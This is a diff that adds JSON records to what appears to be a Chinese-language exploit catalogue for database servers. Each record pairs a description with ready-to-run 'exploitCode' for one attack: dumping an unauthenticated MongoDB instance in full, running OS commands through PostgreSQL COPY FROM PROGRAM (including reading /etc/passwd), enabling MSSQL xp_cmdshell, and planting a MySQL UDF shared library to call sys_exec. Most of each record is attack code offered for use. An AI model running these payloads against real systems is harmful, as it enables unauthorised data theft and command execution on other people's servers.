+    "description": "MongoDB 未启用认证（默认无 auth 或跳过 --auth）且监听公网时，可直接枚举数据库与集合导出全量数据。Shodan 历史上多次出现数万实例暴露事件，是未授权数据访问最典型场景。",
+    "vulnType": "access-control",
+    "affected": "MongoDB 全版本（bind 0.0.0.0 且未启用 authorization）",
+    "severity": "critical",
+    "publishedAt": "2019",
+    "vulnerabilityIds": [],
+    "treePath": "database/access-control/database-access-control-mongodb-unauth",
+    "exploitCode": [
+      {
+        "title": "枚举与导出",
+        "language": "bash",
+        "code": "mongo --host target.local --quiet --eval 'db.adminCommand({listDatabases:1}).databases.forEach(d=>print(d.name))'\n\n# 逐库枚举集合并导出\nmongo --host target.local dbname --eval 'db.getCollectionNames().forEach(c=>print(c, db[c].count()))'\nmongodump --host target.local -d dbname -o ./dump\n\n# 大规模测绘面核查：27017 端口 + 未要求 auth 的实例即风险面。",
+        "description": "从列举库到 mongodump 全量导出的标准动作。"
+      }
+    ],
+    "prerequisites": "27017 对外可达；实例未启用 --auth / security.authorization；无 IP 白名单限制。",
+    "references": [
+      "https://www.mongodb.com/docs/manual/security/",
+      "https://cwe.mitre.org/data/definitions/306.html"
+    ],
+    "tags": [
+      "mongodb",
+      "unauthorized",
+      "data-exposure"
+    ],
+    "attribution": {
+      "source": "MongoDB 官方安全文档与 CWE-306",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "PostgreSQL COPY FROM PROGRAM 命令执行",
+    "description": "PostgreSQL 9.3 起超级用户可执行 COPY ... FROM PROGRAM 从系统命令读取数据。获得 SQL 超级用户权限（弱口令/超级用户直连/注入到 superuser 会话）后即可执行系统命令，pg_exec 扩展与 CVE-2019-9193 均属此能力面。",
+    "vulnType": "rce",
+    "affected": "PostgreSQL >= 9.3（官方定位为超级用户特性，CVE-2019-9193 不修复）",
+    "severity": "high",
+    "publishedAt": "2019-03-20",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2019-9193"
+      }
+    ],
+    "treePath": "database/rce/database-rce-postgresql-copy",
+    "exploitCode": [
+      {
+        "title": "COPY FROM PROGRAM 执行命令并回读",
+        "language": "sql",
+        "code": "-- 超级用户会话（如 postgres 弱口令）\nDROP TABLE IF EXISTS cmd_output;\nCREATE TABLE cmd_output(line TEXT);\nCOPY cmd_output FROM PROGRAM 'id; cat /etc/passwd | head -5';\nSELECT * FROM cmd_output;\n\n-- 大文件场景可将输出落盘到 Web 可写目录配合读文件获取。",
+        "description": "以表为容器接收命令 stdout 的标准执行模式。"
+      }
+    ],
+    "prerequisites": "持有 PostgreSQL 超级用户（superuser）会话；5432 可达；pg_hba 允许来源连接。",
+    "references": [
+      "https://www.postgresql.org/docs/current/sql-copy.html",
+      "https://nvd.nist.gov/vuln/detail/CVE-2019-9193"
+    ],
+    "tags": [
+      "postgresql",
+      "copy-from-program",
+      "rce",
+      "sql"
+    ],
+    "attribution": {
+      "source": "PostgreSQL 官方文档与 NVD",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "MSSQL xp_cmdshell 存储过程命令执行",
+    "description": "SQL Server 的 xp_cmdshell 扩展存储过程以 SQL Server 服务账户身份执行系统命令。默认关闭，但 sysadmin 会话（弱 sa 口令/注入到 sysadmin）可一行 RECONFIGURE 打开。配合注入或弱口令是 Windows 环境数据库横向的常客。",
+    "vulnType": "rce",
+    "affected": "Microsoft SQL Server 全版本（xp_cmdshell 默认关闭，可被 sysadmin 开启）",
+    "severity": "high",
+    "publishedAt": "2018",
+    "vulnerabilityIds": [],
+    "treePath": "database/rce/database-rce-mssql-xp-cmdshell",
+    "exploitCode": [
+      {
+        "title": "开启 xp_cmdshell 并执行命令",
+        "language": "sql",
+        "code": "-- 需要 sysadmin 角色\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'net user';\n\n-- 服务账户通常为 NT SERVICE\\MSSQLSERVER 或域账户，可进一步横向。",
+        "description": "两步 RECONFIGURE 开启后即可执行任意系统命令。"
+      }
+    ],
+    "prerequisites": "获得 sysadmin 会话（sa 弱口令/注入点为 sysadmin/链式提权成功）；1433 可达或可注入。",
+    "references": [
+      "https://learn.microsoft.com/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql",
+      "https://cwe.mitre.org/data/definitions/78.html"
+    ],
+    "tags": [
+      "mssql",
+      "xp_cmdshell",
+      "rce",
+      "database"
+    ],
+    "attribution": {
+      "source": "Microsoft 官方文档与 CWE-78",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "MySQL UDF 动态库命令执行",
+    "description": "MySQL 允许超级用户创建指向自定义动态库的 UDF 函数。将恶意 .so/.dll 写入 plugin 目录（配合 secure_file_priv 与可写目录）后，CREATE FUNCTION sys_exec 即可执行系统命令。对 MySQL < 5.5 时代与误配置环境依旧有效。",
+    "vulnType": "rce",
+    "affected": "MySQL < 5.7 默认宽配置、MariaDB 全版本（依赖 plugin 目录可写与 FILE 权限）",
+    "severity": "high",
+    "publishedAt": "2017",
+    "vulnerabilityIds": [],
+    "treePath": "database/rce/database-rce-mysql-udf",
+    "exploitCode": [
+      {
+        "title": "UDF 动态库写入与注册",
+        "language": "sql",
+        "code": "-- 1) 查询插件目录与是否允许落盘\nSHOW VARIABLES LIKE 'plugin_dir';\nSHOW VARIABLES LIKE 'secure_file_priv';\n\n-- 2) 写入动态库（lib_mysqludf_sys.so，内容可经 hex 编码 SELECT ... INTO DUMPFILE 还原）\nSELECT UNHEX('7F454C46...') INTO DUMPFILE '/usr/lib/mysql/plugin/udfsys.so';\n\n-- 3) 注册并调用\nCREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udfsys.so';\nSELECT sys_exec('whoami > /tmp/out');\nSELECT sys_eval('id');\n",
+        "description": "从插件目录确认到动态库落盘、注册、调用的完整链。"
+      }
+    ],
+    "prerequisites": "MySQL FILE 权限账户；plugin 目录可写且在 secure_file_priv 允许路径内；动态库与目标平台架构匹配。",
+    "references": [
+      "https://dev.mysql.com/doc/refman/8.0/en/create-function-udf.html",
+      "https://github.com/mysqludf/lib_mysqludf_sys"
+    ],
+    "tags": [
+      "mysql",
+      "udf",
+      "rce",
+      "database"
+    ],
+    "attribution": {
+      "source": "MySQL 官方文档与 lib_mysqludf_sys 公开实现",
+      "author": "",
+      "license": ""
+    }
+  }
+]
